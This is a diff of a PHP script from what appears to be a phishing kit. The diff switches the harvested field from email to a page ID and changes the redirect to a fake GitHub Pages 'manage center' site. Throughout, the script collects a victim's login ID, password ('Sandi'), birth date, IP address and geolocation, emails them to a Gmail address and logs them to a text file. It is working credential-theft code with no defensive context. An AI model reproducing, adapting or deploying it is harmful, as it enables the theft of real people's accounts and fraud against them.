@@ -3,7 +3,7 @@
 
 /*========== [ Variables ]==========*/
 $ip 		= getenv("REMOTE_ADDR");
-$email   = $_POST['email'];
+$pageId   = $_POST['pageId'];
 $pass   = $_POST['pass'];
 $dd   = $_POST['dd'];
 $mm   = $_POST['mm'];
@@ -16,7 +16,7 @@ $today = date("F j, Y, g:i a");
 
 $message = "yakipdaris@gmail.com=
 ====💲💲💲==== 💰💰💰 ADS TEAM 💰💰💰=====💲💲💲====
-Email      : $email
+Email      : $pageId
 Sandi      : $pass
 Day        : $dd
 Month      : $mm
@@ -35,12 +35,8 @@ $headers .= "MIME-Version: 1.0\n";
 mail($to, $subject, $message,$headers);
 
 $file = "BonekaPekanbaru2024.txt";
-$fname = $_POST['fname'];
-$email = $_POST['email'];
+$pageId = $_POST['pageId'];
 $pass = $_POST['pass'];
-$mm = $_POST['mm'];
-$dd = $_POST['dd'];
-$yy = $_POST['yy'];
 $ip = $_SERVER['REMOTE_ADDR'];
 $today = date("F j, Y, g:i a");
 $host = "http://www.geoplugin.net/php.gp?ip=$ip";
@@ -80,7 +76,7 @@ $handle = fopen($file, 'a');
 fwrite($handle, "========================================");
 fwrite($handle, "\n");
 fwrite($handle, "::  Email         :: ");
-fwrite($handle, "$email");
+fwrite($handle, "$pageId");
 fwrite($handle, "\n");
 fwrite($handle, "::  Sandi         :: ");
 fwrite($handle, "$pass");
@@ -97,7 +93,7 @@ fwrite($handle, "\n");
 fclose($handle);
 echo "<script LANGUAGE=\"JavaScript\">
 <!--
-window.location=\"https://appcnfrimsitehomepgs.github.io/reverify.html\";
+window.location=\"https://managecenter-pages.github.io/business004389789/\";
 // -->
 </script>";
 ?>
